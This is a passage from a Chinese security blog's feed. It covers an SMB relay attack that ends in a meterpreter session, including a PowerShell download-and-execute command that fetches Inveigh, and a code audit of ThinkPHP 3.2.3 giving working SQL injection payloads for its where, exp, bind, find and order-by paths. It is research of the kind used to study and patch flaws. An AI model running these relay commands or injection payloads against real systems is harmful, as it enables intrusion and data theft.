class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exe</span><br><span class="line">python smbrelayx.py -h 192.168.50.241 -e &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure><p>在内网其他目标机器执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use192.168.50.64\c$ &quot;fx@123.com&quot; &#x2F;user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure><p>在msf上成功获取到meterpreter</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt="" loading="lazy"></p><h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Kevin-Robertson&#x2F;Inveigh&#x2F;master&#x2F;Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</span><br></pre></td></tr></table></figure><p>在其他主机上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片</span><br><span class="line">&lt;img src&#x3D;&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt="" loading="lazy"></p><p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;高权限读取本地密码&quot;&gt;&lt;a href=&quot;#高权限读取本地密码&quot; class=&quot;headerlink&quot; title=&quot;高权限读取本地密码&quot;&gt;&lt;/a&gt;&lt;strong&gt;高权限读取本地密码&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;当域管理员在域成员机器上登录进行工作的时候，会将明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.3 注入分析</title>
    <link href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-04-29T02:19:26.492Z</updated>
    
    <content type="html"><![CDATA[<h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;where(<span class="string">'id='</span>.I(<span class="string">'id'</span>))-&gt;find();</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(strtolower($method)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'get'</span>     :   </span><br><span class="line">        $input =&amp; $_GET;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'post'</span>    :   </span><br><span class="line">        $input =&amp; $_POST;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'put'</span>     :   </span><br><span class="line">        <span class="keyword">if</span>(is_null($_PUT))&#123;</span><br><span class="line">            parse_str(file_get_contents(<span class="string">'php://input'</span>), $_PUT);</span><br><span class="line">        &#125;</span><br><span class="line">        $input =$_PUT;        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'param'</span>   :</span><br><span class="line">            <span class="keyword">switch</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                    $input  =  $_POST;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">                <span class="keyword">if</span>(is_null($_PUT))&#123;</span><br><span class="line">                    parse_str(file_get_contents(<span class="string">'php://input'</span>), $_PUT);</span><br><span class="line">                &#125;</span><br><span class="line">                $input =$_PUT;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $input  =  $_GET;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure><p>重点看过滤函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt="" loading="lazy"></p><p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line"><span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在where方法中，将$where的值放入到options[“where”]数组中</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt="" loading="lazy"></p><p>继续跟进查看find方法，第748行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$options     =   <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br></pre></td></tr></table></figure><p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result   = <span class="keyword">$this</span>-&gt;query($sql,!<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt="" loading="lazy"></p><p>这里主要查看parseWhere方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt="" loading="lazy"></p><p>跟进parseThinkWhere方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseThinkWhere</span><span class="params">($key,$val)</span> </span>&#123;</span><br><span class="line">        $whereStr   = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">switch</span>($key) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'_string'</span>:</span><br><span class="line">                <span class="comment">// 字符串模式查询条件</span></span><br><span class="line">                $whereStr = $val;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'_complex'</span>:</span><br><span class="line">                <span class="comment">// 复合查询条件</span></span><br><span class="line">                $whereStr = substr(<span class="keyword">$this</span>-&gt;parseWhere($val),<span class="number">6</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and 1&#x3D;updatexml(1,concat(0x7e,(user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt="" loading="lazy"></p><h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $User = D(<span class="string">'User'</span>);</span><br><span class="line">        $map = <span class="keyword">array</span>(<span class="string">'id'</span> =&gt; $_GET[<span class="string">'id'</span>]);</span><br><span class="line">        $user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">        dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt="" loading="lazy"></p><p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt="" loading="lazy"></p><p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]&#x3D;exp&amp;id[1]&#x3D;&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt="" loading="lazy"></p><p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))</span><br></pre></td></tr></table></figure><h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">        $uname[<span class="string">'username'</span>] = I(<span class="string">'username'</span>);</span><br><span class="line">        $user = M(<span class="string">'User'</span>)-&gt;where($data)-&gt;save($uname);</span><br><span class="line">        dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F8跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt="" loading="lazy"></p><p>生成sql语句在update方法中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($data,$options)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>());</span><br><span class="line">        $table  =   <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]);</span><br><span class="line">        $sql   = <span class="string">'UPDATE '</span> . $table . <span class="keyword">$this</span>-&gt;parseSet($data);</span><br><span class="line">        <span class="keyword">if</span>(strpos($table,<span class="string">','</span>))&#123;<span class="comment">// 多表更新支持JOIN操作</span></span><br><span class="line">            $sql .= <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>])?$options[<span class="string">'join'</span>]:<span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql .= <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>])?$options[<span class="string">'where'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(!strpos($table,<span class="string">','</span>))&#123;</span><br><span class="line">            <span class="comment">//  单表更新支持order和lmit</span></span><br><span class="line">            $sql   .=  <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>)</span><br><span class="line">                .<span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>])?$options[<span class="string">'limit'</span>]:<span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql .=   <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>])?$options[<span class="string">'comment'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute($sql,!<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在parseSet方法中，可以将传入的参数替换成:0</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt="" loading="lazy"></p><p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindParam</span><span class="params">($name,$value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind[<span class="string">':'</span>.$name]  =   $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt="" loading="lazy"></p><p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt="" loading="lazy"></p><p>所以最终的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]&#x3D;bind&amp;id[1]&#x3D;0 and 1&#x3D;(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username&#x3D;fanxing</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt="" loading="lazy"></p><h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;find(I(<span class="string">'id'</span>));</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt="" loading="lazy"></p><p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where)</span> </span>&#123;</span><br><span class="line">        $whereStr = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_string($where)) &#123;</span><br><span class="line">            <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">            $whereStr = $where;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>($whereStr)?<span class="string">''</span>:<span class="string">' WHERE '</span>.$whereStr;</span><br></pre></td></tr></table></figure><p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt="" loading="lazy"></p><p>所以，payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and 1&#x3D;updatexml(1,concat(0x7e,(user()),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt="" loading="lazy"></p><p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($options[<span class="string">'where'</span>]))&#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">if</span>(is_array($options[<span class="string">'where'</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">'where'</span>][$pk]))&#123;</span><br><span class="line">            $pkValue            =  $options[<span class="string">'where'</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data[<span class="string">'username'</span>] = <span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'admin'</span>);</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;where($data)-&gt;order(I(<span class="string">'order'</span>))-&gt;find();</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>),</span><br></pre></td></tr></table></figure><p>当$options[‘order’]参数参在时，跟进parseOrder方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt="" loading="lazy"></p><p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order&#x3D;id and(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt="" loading="lazy"></p><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。</span><br><span class="line">S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</span><br></pre></td></tr></table></figure><p>这里F方法就不介绍了，直接看S方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    S(<span class="string">'name'</span>,I(<span class="string">'test'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进查看S方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt="" loading="lazy"></p><p>set方法写入缓存</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt="" loading="lazy"></p><p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        $name=md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_SUBDIR'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $dir   =<span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;C(<span class="string">'DATA_PATH_LEVEL'</span>);$i++) &#123;</span><br><span class="line">                $dir.=$name&#123;$i&#125;.<span class="string">'/'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir)) &#123;</span><br><span class="line">                mkdir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir,<span class="number">0755</span>,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $filename=$dir.<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;where注入&quot;&gt;&lt;a href=&quot;#where注入&quot; class=&quot;headerlink&quot; title=&quot;where注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;where注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在控制器中，写个demo，利用字符串方式作为where传参时存在注
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
